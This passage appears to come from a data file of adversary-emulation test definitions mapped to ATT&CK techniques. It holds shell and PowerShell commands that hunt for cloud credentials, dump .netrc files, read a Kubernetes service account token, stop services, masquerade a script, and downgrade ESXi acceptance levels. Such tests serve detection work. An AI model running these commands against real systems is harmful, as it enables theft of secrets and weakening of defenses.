    "display_name": "Remote System Discovery",
    "source_file": "T1018.yaml",
    "test_name": "Remote System Discovery - ip neighbour",
    "test_guid": "158bd4dd-6359-40ab-b13c-285b9ef6fa25",
    "description": "Use the ip neighbour command to display the known link layer (ARP table) addresses for hosts sharing the same network segment. \n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "ip neighbour show\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if ip command exists on the machine\n",
        "prereq_command": "if [ -x \"$(command -v ip)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "apt-get install iproute2 -y\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Use the ip neighbour command to display the known link layer (ARP table) addresses for hosts sharing the same network segment. \n",
    "indexed_technique": "T1018.03",
    "technique_index": 3,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1018",
    "display_name": "Remote System Discovery",
    "source_file": "T1018.yaml",
    "test_name": "Remote System Discovery - ip route",
    "test_guid": "1a4ebe70-31d0-417b-ade2-ef4cb3e7d0e1",
    "description": "Use the ip route command to display the kernels routing tables. \n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "ip route show\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if ip command exists on the machine\n",
        "prereq_command": "if [ -x \"$(command -v ip)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "apt-get install iproute2 -y\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Use the ip route command to display the kernels routing tables. \n",
    "indexed_technique": "T1018.04",
    "technique_index": 4,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1018",
    "display_name": "Remote System Discovery",
    "source_file": "T1018.yaml",
    "test_name": "Remote System Discovery - netstat",
    "test_guid": "d2791d72-b67f-4615-814f-ec824a91f514",
    "description": "Use the netstat command to display the kernels routing tables.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "netstat -r | grep default\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Use the netstat command to display the kernels routing tables.\n",
    "indexed_technique": "T1018.05",
    "technique_index": 5,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1018",
    "display_name": "Remote System Discovery",
    "source_file": "T1018.yaml",
    "test_name": "Remote System Discovery - ip tcp_metrics",
    "test_guid": "6c2da894-0b57-43cb-87af-46ea3b501388",
    "description": "Use the ip tcp_metrics command to display the recent cached entries for IPv4 and IPv6 source and destination addresses. \n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "ip tcp_metrics show |grep --invert-match \"^127\\.\"\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if ip command exists on the machine\n",
        "prereq_command": "if [ -x \"$(command -v ip)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "apt-get install iproute2 -y\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Use the ip tcp_metrics command to display the recent cached entries for IPv4 and IPv6 source and destination addresses. \n",
    "indexed_technique": "T1018.06",
    "technique_index": 6,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1547.006",
    "display_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
    "source_file": "T1547.006.yaml",
    "test_name": "Linux - Load Kernel Module via insmod",
    "test_guid": "687dcb93-9656-4853-9c36-9977315e9d23",
    "description": "This test uses the insmod command to load a kernel module (/tmp/T1547.006/T1547006.ko) for Linux.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo insmod #{module_path}\n",
      "cleanup_command": "sudo rmmod #{module_name}\n[ -f #{temp_folder}/safe_to_delete ] && rm -rf #{temp_folder}\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {
      "module_name": {
        "description": "Name of the kernel module name.",
        "type": "string",
        "default": "T1547006"
      },
      "module_path": {
        "description": "Folder used to store the module.",
        "type": "path",
        "default": "/tmp/T1547.006/T1547006.ko"
      },
      "temp_folder": {
        "description": "Temp folder used to compile the code.",
        "type": "path",
        "default": "/tmp/T1547.006"
      },
      "module_source_path": {
        "description": "Path to download Gsecdump binary file",
        "type": "path",
        "default": "PathToAtomicsFolder/T1547.006/src"
      }
    },
    "dependencies": [
      {
        "description": "The kernel module must exist on disk at specified location\n",
        "prereq_command": "if [ -f #{module_path} ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "if [ ! -d #{temp_folder} ]; then mkdir #{temp_folder}; touch #{temp_folder}/safe_to_delete; fi;\ncp #{module_source_path}/* #{temp_folder}/\ncd #{temp_folder}; make\nif [ ! -f #{module_path} ]; then mv #{temp_folder}/#{module_name}.ko #{module_path}; fi;\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "This test uses the insmod command to load a kernel module for Linux.\n",
    "indexed_technique": "T1547.006.01",
    "technique_index": 1,
    "categories": [
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1552.001",
    "display_name": "Unsecured Credentials: Credentials In Files",
    "source_file": "T1552.001.yaml",
    "test_name": "Find AWS credentials",
    "test_guid": "37807632-d3da-442e-8c2e-00f44928ff8f",
    "description": "Find local AWS credentials from file, defaults to using / as the look path.\n",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "find #{file_path}/.aws -name \"credentials\" -type f 2>/dev/null\n",
      "name": "sh"
    },
    "input_arguments": {
      "file_path": {
        "description": "Path to search",
        "type": "string",
        "default": "/"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Find local AWS credentials from file, defaults to using / as the look path.\n",
    "indexed_technique": "T1552.001.01",
    "technique_index": 1,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1552.001",
    "display_name": "Unsecured Credentials: Credentials In Files",
    "source_file": "T1552.001.yaml",
    "test_name": "Extract passwords with grep",
    "test_guid": "bd4cf0d1-7646-474e-8610-78ccf5a097c4",
    "description": "This test uses grep to search for the string 'password' recursively in all files starting from /.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "grep -ri password #{file_path}\nexit 0\n",
      "name": "sh"
    },
    "input_arguments": {
      "file_path": {
        "description": "Path to search",
        "type": "string",
        "default": "/"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Extracting credentials from files\n",
    "indexed_technique": "T1552.001.02",
    "technique_index": 2,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1552.001",
    "display_name": "Unsecured Credentials: Credentials In Files",
    "source_file": "T1552.001.yaml",
    "test_name": "Find and Access Github Credentials",
    "test_guid": "da4f751a-020b-40d7-b9ff-d433b7799803",
    "description": "This test looks for .netrc files (which stores github credentials in clear text )and dumps its contents if found.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": false,
      "command": "for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done\n"
    },
    "input_arguments": {
      "file_path": {
        "description": "Path to search",
        "type": "string",
        "default": "/home"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test looks for .netrc files (which stores github credentials in clear text )and dumps its contents if found.\n",
    "indexed_technique": "T1552.001.03",
    "technique_index": 3,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1552.001",
    "display_name": "Unsecured Credentials: Credentials In Files",
    "source_file": "T1552.001.yaml",
    "test_name": "Find Azure credentials",
    "test_guid": "a8f6148d-478a-4f43-bc62-5efee9f931a4",
    "description": "Find local Azure credentials from file, defaults to using / as the look path.\n",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "find #{file_path}/.azure -name \"msal_token_cache.json\" -o -name \"accessTokens.json\" -type f 2>/dev/null\n",
      "name": "sh"
    },
    "input_arguments": {
      "file_path": {
        "description": "Path to search",
        "type": "string",
        "default": "/"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Find local Azure credentials from file, defaults to using / as the look path.\n",
    "indexed_technique": "T1552.001.04",
    "technique_index": 4,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1552.001",
    "display_name": "Unsecured Credentials: Credentials In Files",
    "source_file": "T1552.001.yaml",
    "test_name": "Find GCP credentials",
    "test_guid": "aa12eb29-2dbb-414e-8b20-33d34af93543",
    "description": "Find local Google Cloud Platform credentials from file, defaults to using / as the look path.\n",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "find #{file_path}/.config/gcloud -name \"credentials.db\" -o -name \"access_tokens.db\" -type f 2>/dev/null\n",
      "name": "sh"
    },
    "input_arguments": {
      "file_path": {
        "description": "Path to search",
        "type": "string",
        "default": "/"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Find local Google Cloud Platform credentials from file, defaults to using / as the look path.\n",
    "indexed_technique": "T1552.001.05",
    "technique_index": 5,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1552.001",
    "display_name": "Unsecured Credentials: Credentials In Files",
    "source_file": "T1552.001.yaml",
    "test_name": "Find OCI credentials",
    "test_guid": "9d9c22c9-fa97-4008-a204-478cf68c40af",
    "description": "Find local Oracle cloud credentials from file, defaults to using / as the look path.\n",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "find #{file_path}/.oci/sessions -name \"token\" -type f 2>/dev/null\n",
      "name": "sh"
    },
    "input_arguments": {
      "file_path": {
        "description": "Path to search",
        "type": "string",
        "default": "/"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Find local Oracle cloud credentials from file, defaults to using / as the look path.\n",
    "indexed_technique": "T1552.001.06",
    "technique_index": 6,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1036.006",
    "display_name": "Masquerading: Space after Filename",
    "source_file": "T1036.006.yaml",
    "test_name": "Space After Filename",
    "test_guid": "b95ce2eb-a093-4cd8-938d-5258cef656ea",
    "description": "This test creates a directory and script named 'init ' with a trailing space in /tmp/atomic-test-T1036.006/testdirwithspaceend to masquerade as a legitimate file and executes it.",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "name": "sh",
      "command": "mkdir -p /tmp/atomic-test-T1036.006\ncd /tmp/atomic-test-T1036.006\nmkdir -p 'testdirwithspaceend '\n[ \"$(uname)\" = 'FreeBSD' ] && /bin/echo \"#\\!/bin/sh\" > \"testdirwithspaceend /init \" && echo 'echo \"print(\\\"running T1035.006 with space after filename to masquerade init\\\")\" | python3.9' >> \"testdirwithspaceend /init \" && echo \"exit\" >> \"testdirwithspaceend /init \" || /usr/bin/echo -e \"%d\\na\\n#!/usr/bin/perl\\nprint \\\"running T1035.006 with space after filename to masquerade init\\\\n\\\";\\nqx/cp \\/usr\\/bin\\/perl 'init  '/;\\nqx/'.\\/init  ' -e 'sleep 5'/;\\n.\\nwq\\n\" | ed 'testdirwithspaceend /init ' >/dev/null\nchmod +x 'testdirwithspaceend /init '\n'./testdirwithspaceend /init '\n",
      "cleanup_command": "rm -rf /tmp/atomic-test-T1036.006"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Space after filename.\n",
    "indexed_technique": "T1036.006.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1614",
    "display_name": "System Location Discovery",
    "source_file": "T1614.yaml",
    "test_name": "Get geolocation info through IP-Lookup services using curl freebsd, linux or macos",
    "test_guid": "552b4db3-8850-412c-abce-ab5cc8a86604",
    "description": "This test uses curl to retrieve geolocation information from https://ipinfo.io/.",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": false,
      "command": "curl -k #{ip_lookup_url}\n"
    },
    "input_arguments": {
      "ip_lookup_url": {
        "description": "URL of the IP-Lookup service",
        "type": "url",
        "default": "https://ipinfo.io/"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Get geolocation info through IP-Lookup services using curl Windows. The default URL of the IP-Lookup service is https://ipinfo.io/. References: https://securelist.com/transparent-tribe-part-1/98127/ and https://news.sophos.com/en-us/2016/05/03/location-based-ransomware-threat-research/\n",
    "indexed_technique": "T1614.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1489",
    "display_name": "Service Stop",
    "source_file": "T1489.yaml",
    "test_name": "Linux - Stop service using systemctl",
    "test_guid": "42e3a5bd-1e45-427f-aa08-2a65fa29a820",
    "description": "Stops a specified service (cron) using the systemctl command.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo systemctl stop #{service_name}\n",
      "cleanup_command": "sudo systemctl start #{service_name} 2> /dev/null\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "service_name": {
        "description": "Name of a service to stop",
        "type": "string",
        "default": "cron"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Stops a specified service using the systemctl command.\nUpon execution, if the specified service was running, it will change to a state of inactive and it can be restarted by running the cleanup command.\nYou can list all available services with following command: \"systemctl list-units --type=service\"\n",
    "indexed_technique": "T1489.01",
    "technique_index": 1,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1489",
    "display_name": "Service Stop",
    "source_file": "T1489.yaml",
    "test_name": "Linux - Stop service by killing process using killall",
    "test_guid": "e5d95be6-02ee-4ff1-aebe-cf86013b6189",
    "description": "Stops a specified service (cron) by sending a SIGTERM signal to the linked process using the killall command.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo killall -SIGTERM #{process_name}\n",
      "cleanup_command": "sudo systemctl start #{service_name} 2> /dev/null\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "process_name": {
        "description": "Name of a process to stop",
        "type": "string",
        "default": "cron"
      },
      "service_name": {
        "description": "Name of a service to restart",
        "type": "string",
        "default": "cron"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Stops a specified service by sending a SIGTERM signal to the linked process using the killall command.\nUpon execution, if the service's main process was running, it will be terminated.\nIf the service was not running, no process will be found to kill and it can be restarted by running the cleanup command.\nYou can list all available services with following command: \"systemctl list-units --type=service\"\n",
    "indexed_technique": "T1489.02",
    "technique_index": 2,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1489",
    "display_name": "Service Stop",
    "source_file": "T1489.yaml",
    "test_name": "Linux - Stop service by killing process using kill",
    "test_guid": "332f4c76-7e96-41a6-8cc2-7361c49db8be",
    "description": "Stops a specified service (cron) by sending a SIGTERM signal to the linked process using the kill command.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo kill -SIGTERM $(pgrep #{process_name})\n",
      "cleanup_command": "sudo systemctl start #{service_name} 2> /dev/null\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "process_name": {
        "description": "Name of a process to kill",
        "type": "string",
        "default": "cron"
      },
      "service_name": {
        "description": "Name of a service to restart",
        "type": "string",
        "default": "cron"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Stops a specified service by sending a SIGTERM signal to the linked process using the kill command. Upon execution, if the service's main process was running, it will be terminated.\nIf the service was not running, no process will be found to kill and it can be restarted by running the cleanup command.\nYou can list all available services with following command: \"systemctl list-units --type=service\"\n",
    "indexed_technique": "T1489.03",
    "technique_index": 3,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1489",
    "display_name": "Service Stop",
    "source_file": "T1489.yaml",
    "test_name": "Linux - Stop service by killing process using pkill",
    "test_guid": "08b4718f-a8bf-4bb5-a552-294fc5178fea",
    "description": "Stops a specified service (cron) by sending a SIGTERM signal to the linked process using pkill.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo pkill -SIGTERM #{process_pattern}\n",
      "cleanup_command": "sudo systemctl start #{service_name} 2> /dev/null\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "process_pattern": {
        "description": "Pattern to match the name of the process to kill",
        "type": "string",
        "default": "^cron$"
      },
      "service_name": {
        "description": "Name of a service to restart",
        "type": "string",
        "default": "cron"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Stops a specified service by sending a SIGTERM signal to the linked process using pkill. This method is effective when multiple instances of the process may be running.\nUpon execution, if any instances of the process were running, they will be terminated. If no instances were running, pkill will not find any processes to kill.\nStopped service can be restarted by running the cleanup command.\nYou can list all available services with following command: \"systemctl list-units --type=service\"\n",
    "indexed_technique": "T1489.04",
    "technique_index": 4,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1048.003",
    "display_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
    "source_file": "T1048.003.yaml",
    "test_name": "Python3 http.server",
    "test_guid": "3ea1f938-f80a-4305-9aa8-431bc4867313",
    "description": "This test checks if python3 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "[ \"$(uname)\" = 'FreeBSD' ] && alias python3=python3.9\nif [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.\n",
    "indexed_technique": "T1048.003.01",
    "technique_index": 1,
    "categories": [
      "exfiltration"
    ]
  },
  {
    "attack_technique": "T1562.010",
    "display_name": "Impair Defenses: Downgrade Attack",
    "source_file": "T1562.010.yaml",
    "test_name": "ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI",
    "test_guid": "062f92c9-28b1-4391-a5f8-9d8ca6852091",
    "description": "This test uses esxcli to set the VIB acceptance level to CommunitySupported on the ESXi host atomic.local with root user credentials (pass).",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\n(Get-EsxCli -VMHost #{vm_host} -V2).software.acceptance.set.Invoke(@{level = \"CommunitySupported\"})\nDisconnect-VIServer -Confirm:$false\n",
      "name": "powershell",
      "elevation_required": true
    },
    "input_arguments": {
      "vm_host": {
        "description": "Specify the host name of the ESXi Server",
        "type": "string",
        "default": "atomic.local"
      },
      "vm_user": {
        "description": "Specify the privilege user account on ESXi Server",
        "type": "string",
        "default": "root"
      },
      "vm_pass": {
        "description": "Specify the privilege user password on ESXi Server",
        "type": "string",
        "default": "pass"
      }
    },
    "dependencies": [
      {
        "description": "Check if VMWARE PowerCLI PowerShell Module is installed.\n",
        "prereq_command": "$RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable\nif (-not $RequiredModule) {exit 1}\n",
        "get_prereq_command": "Install-Module -Name VMware.PowerCLI -Confirm:$false\n"
      }
    ],
    "dependency_executor_name": "powershell",
    "original_description": "An adversary can change the VIB acceptance level to CommunitySupported to downgrade the acceptance criteria.This can be accomplished via PowerCLI. Afterwards an adversary may proceed to installing malicious VIBs on the host.\n[Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)\n",
    "indexed_technique": "T1562.010.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1552.007",
    "display_name": "Kubernetes List Secrets",
    "source_file": "T1552.007.yaml",
    "test_name": "Cat the contents of a Kubernetes service account token file",
    "test_guid": "788e0019-a483-45da-bcfe-96353d46820f",
    "description": "Access the Kubernetes service account access token stored within a container in a cluster.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token\n",
      "name": "sh",
      "cleanup_command": "kubectl --context kind-atomic-cluster delete pod atomic-pod\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Verify docker is installed.",
        "prereq_command": "which docker\n",
        "get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
      },
      {
        "description": "Verify docker service is running.",
        "prereq_command": "sudo systemctl status docker\n",
        "get_prereq_command": "sudo systemctl start docker\n"
      },
      {
        "description": "Verify kind is in the path.",
        "prereq_command": "which kind\n",
        "get_prereq_command": "curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64\nchmod +x ./kind\nmv kind /usr/bin/kind\n"
      },
      {
        "description": "Verify kind-atomic-cluster is created",
        "prereq_command": "sudo kind get clusters\n",
        "get_prereq_command": "sudo kind create cluster --name atomic-cluster\n"
      },
      {
        "description": "Verify kubectl is in path",
        "prereq_command": "which kubectl\n",
        "get_prereq_command": "curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x ./kubectl\nmv kubectl /usr/bin/kubectl\n"
      },
      {
        "description": "Verify atomic-pod is running.",
        "prereq_command": "kubectl --context kind-atomic-cluster get pods |grep atomic-pod\n",
        "get_prereq_command": "kubectl --context kind-atomic-cluster run atomic-pod --image=alpine --command -- sleep infinity\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Access the Kubernetes service account access token stored within a container in a cluster.\n",
    "indexed_technique": "T1552.007.01",
    "technique_index": 1,
    "categories": [
      "credential-access"
    ]
  }
]